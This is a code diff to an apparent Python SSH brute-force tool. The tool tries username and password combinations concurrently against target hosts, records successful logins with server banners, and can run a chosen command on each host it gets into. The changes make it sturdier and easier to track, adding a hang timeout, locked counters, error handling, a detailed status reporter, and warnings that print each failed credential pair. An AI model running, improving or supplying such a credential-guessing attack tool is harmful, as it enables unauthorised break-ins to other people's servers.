@@ -16,6 +16,7 @@ import json
 import os
 import random
 import contextlib
+import time
 from dataclasses import dataclass, field
 from pathlib import Path
 from typing import Dict, Iterable, List, Optional, Sequence, Set, Tuple
@@ -51,6 +52,7 @@ class Config:
     shuffle: bool = True
     results_path: Path = Path("results.jsonl")
     log_interval: float = 5.0
+    hang_timeout: float = 60.0  # seconds with no progress before declaring hang (0 disables)
 
 
 @dataclass
@@ -212,7 +214,8 @@ async def attempt_login(
     host_state: HostState,
     global_stop: asyncio.Event,
     file_lock: asyncio.Lock,
-    stats: Dict[str, int],
+    stats: Dict[str, float],
+    stats_lock: asyncio.Lock,
 ) -> None:
     if global_stop.is_set() or host_state.stop.is_set():
         return
@@ -229,11 +232,23 @@ async def attempt_login(
             connect_timeout=cfg.connect_timeout,
             compression_algs=["none"],
         )
-    except (asyncssh.PermissionDenied, asyncssh.misc.DisconnectError, asyncio.TimeoutError):
-        stats["failures"] += 1
+    except (asyncssh.PermissionDenied, asyncssh.misc.DisconnectError, asyncio.TimeoutError) as exc:
+        async with stats_lock:
+            stats["failures"] += 1
+            stats["last_progress"] = time.monotonic()
+        print(f"[warn] auth failed {item.host}:{item.port} {item.user}:{item.password} ({exc})")
         return
-    except OSError:
-        stats["failures"] += 1
+    except OSError as exc:
+        async with stats_lock:
+            stats["failures"] += 1
+            stats["last_progress"] = time.monotonic()
+        print(f"[warn] connection error {item.host}:{item.port} ({exc})")
+        return
+    except Exception as exc:
+        async with stats_lock:
+            stats["errors"] += 1
+            stats["last_progress"] = time.monotonic()
+        print(f"[error] unexpected error before auth {item.host}:{item.port}: {exc}")
         return
 
     async with conn:
@@ -251,10 +266,10 @@ async def attempt_login(
                     record["command"] = cfg.command
                     record["stdout"] = result.stdout
                     record["stderr"] = result.stderr
-            except Exception:
+            except Exception as exc:
                 record["command"] = cfg.command
                 record["stdout"] = ""
-                record["stderr"] = "<command error>"
+                record["stderr"] = f"<command error: {exc}>"
 
         if host_state.banner:
             record["banner"] = host_state.banner
@@ -264,7 +279,9 @@ async def attempt_login(
             with cfg.results_path.open("a", encoding="utf-8") as f:
                 f.write(dumps_json(record) + "\n")
 
-        stats["successes"] += 1
+        async with stats_lock:
+            stats["successes"] += 1
+            stats["last_progress"] = time.monotonic()
 
         if cfg.stop_first_host:
             host_state.stop.set()
@@ -278,7 +295,8 @@ async def worker(
     host_states: Dict[str, HostState],
     global_stop: asyncio.Event,
     file_lock: asyncio.Lock,
-    stats: Dict[str, int],
+    stats: Dict[str, float],
+    stats_lock: asyncio.Lock,
 ) -> None:
     while True:
         item = await queue.get()
@@ -287,12 +305,27 @@ async def worker(
             return
 
         if global_stop.is_set() or host_states[item.host].stop.is_set():
+            async with stats_lock:
+                stats["skipped"] += 1
+                stats["last_progress"] = time.monotonic()
             queue.task_done()
             continue
 
-        await attempt_login(item, cfg, host_states[item.host], global_stop, file_lock, stats)
-        stats["attempts"] += 1
-        queue.task_done()
+        async with stats_lock:
+            stats["active"] += 1
+        try:
+            await attempt_login(item, cfg, host_states[item.host], global_stop, file_lock, stats, stats_lock)
+        except Exception as exc:
+            async with stats_lock:
+                stats["errors"] += 1
+                stats["last_progress"] = time.monotonic()
+            print(f"[error] worker crash avoided for {item.host}:{item.port}: {exc}")
+        finally:
+            async with stats_lock:
+                stats["active"] = max(0, stats["active"] - 1)
+                stats["attempts"] += 1
+                stats["last_progress"] = time.monotonic()
+            queue.task_done()
 
 
 # -----------------------------------------------------------------------------
@@ -303,18 +336,20 @@ async def worker(
 async def build_queue(
     cfg: Config, queue: "asyncio.Queue[Optional[WorkItem]]", host_states: Dict[str, HostState]
 ) -> None:
-    items = []
-    for host, ports in cfg.targets.items():
-        host_states.setdefault(host, HostState())
-        for port in ports:
-            for user, pwd in cfg.combos:
-                items.append(WorkItem(host, port, user, pwd))
-
+    hosts = list(cfg.targets.items())
+    combos = list(cfg.combos)
     if cfg.shuffle:
-        random.shuffle(items)
+        random.shuffle(hosts)
+        random.shuffle(combos)
 
-    for item in items:
-        await queue.put(item)
+    for host, ports in hosts:
+        host_states.setdefault(host, HostState())
+        port_list = list(ports)
+        if cfg.shuffle:
+            random.shuffle(port_list)
+        for port in port_list:
+            for user, pwd in combos:
+                await queue.put(WorkItem(host, port, user, pwd))
 
     for _ in range(cfg.max_workers):
         await queue.put(None)
@@ -350,13 +385,51 @@ async def probe_targets(cfg: Config, host_states: Dict[str, HostState]) -> None:
         raise SystemExit("No live SSH targets after probing.")
 
 
-async def progress_reporter(stats: Dict[str, int], interval: float, stop: asyncio.Event) -> None:
+async def progress_reporter(
+    cfg: Config,
+    stats: Dict[str, float],
+    stats_lock: asyncio.Lock,
+    queue: "asyncio.Queue[Optional[WorkItem]]",
+    stop: asyncio.Event,
+    global_stop: asyncio.Event,
+) -> None:
+    start_time = time.monotonic()
     while not stop.is_set():
-        await asyncio.sleep(interval)
-        attempts = stats.get("attempts", 0)
-        successes = stats.get("successes", 0)
-        failures = stats.get("failures", 0)
-        print(f"[progress] attempts={attempts} successes={successes} failures={failures}")
+        await asyncio.sleep(cfg.log_interval)
+        now = time.monotonic()
+        async with stats_lock:
+            attempts = int(stats.get("attempts", 0))
+            successes = int(stats.get("successes", 0))
+            failures = int(stats.get("failures", 0))
+            errors = int(stats.get("errors", 0))
+            skipped = int(stats.get("skipped", 0))
+            active = int(stats.get("active", 0))
+            total = int(stats.get("total", 0))
+            last_progress = stats.get("last_progress", start_time)
+        elapsed = now - start_time
+        idle = now - last_progress if last_progress else 0.0
+        done = attempts + skipped
+        pending = max(total - done, 0)
+        rate = attempts / elapsed if elapsed > 0 else 0.0
+        success_rate = successes / attempts if attempts else 0.0
+        qsize = queue.qsize()
+        lines = [
+            "[status]",
+            f"  elapsed: {elapsed:.1f}s | rate: {rate:.2f}/s | idle: {idle:.1f}s",
+            f"  queue: {qsize} | pending-est: {pending} | active: {active}/{cfg.max_workers}",
+            f"  attempts: {attempts}/{total} | successes: {successes} | failures: {failures} | skipped: {skipped} | errors: {errors}",
+            f"  success-rate: {success_rate:.2%}",
+        ]
+        print("\n".join(lines))
+
+        if cfg.hang_timeout > 0 and idle > cfg.hang_timeout and pending > 0:
+            print(f"[hang] No progress for {idle:.1f}s (threshold {cfg.hang_timeout}s). Signaling stop.")
+            stop.set()
+            global_stop.set()
+
+
+def count_work_items(cfg: Config) -> int:
+    return sum(len(ports) * len(cfg.combos) for ports in cfg.targets.values())
 
 
 async def run(cfg: Config) -> None:
@@ -366,17 +439,26 @@ async def run(cfg: Config) -> None:
     queue: "asyncio.Queue[Optional[WorkItem]]" = asyncio.Queue(maxsize=cfg.queue_size)
     global_stop = asyncio.Event()
     file_lock = asyncio.Lock()
-    stats = {"attempts": 0, "successes": 0, "failures": 0}
-
-    await build_queue(cfg, queue, host_states)
+    stats_lock = asyncio.Lock()
+    stats: Dict[str, float] = {
+        "attempts": 0,
+        "successes": 0,
+        "failures": 0,
+        "skipped": 0,
+        "errors": 0,
+        "active": 0,
+        "total": count_work_items(cfg),
+        "last_progress": time.monotonic(),
+    }
 
     workers = [
-        asyncio.create_task(worker(queue, cfg, host_states, global_stop, file_lock, stats))
+        asyncio.create_task(worker(queue, cfg, host_states, global_stop, file_lock, stats, stats_lock))
         for _ in range(cfg.max_workers)
     ]
     reporter_stop = asyncio.Event()
-    reporter = asyncio.create_task(progress_reporter(stats, cfg.log_interval, reporter_stop))
+    reporter = asyncio.create_task(progress_reporter(cfg, stats, stats_lock, queue, reporter_stop, global_stop))
 
+    await build_queue(cfg, queue, host_states)
     await queue.join()
     global_stop.set()
     reporter_stop.set()
@@ -412,6 +494,7 @@ def build_parser() -> argparse.ArgumentParser:
     p.add_argument("--auth-timeout", type=float, default=5.0)
     p.add_argument("--read-timeout", type=float, default=3.0)
     p.add_argument("--log-interval", type=float, default=5.0, help="seconds between progress prints")
+    p.add_argument("--hang-timeout", type=float, default=60.0, help="seconds with no progress before hang stop (0 to disable)")
 
     p.add_argument("--command", help="run this command on success")
     p.add_argument("--no-command-output", action="store_true", help="suppress command stdout/stderr in logs")
@@ -445,12 +528,15 @@ def main(argv: Optional[Sequence[str]] = None) -> None:
         shuffle=not args.no_shuffle,
         results_path=Path(args.results),
         log_interval=args.log_interval,
+        hang_timeout=args.hang_timeout,
     )
 
     try:
         asyncio.run(run(cfg))
     except KeyboardInterrupt:
         print("Interrupted, exiting.")
+    except Exception as exc:
+        print(f"[fatal] Unhandled error: {exc}")
 
 
 if __name__ == "__main__":
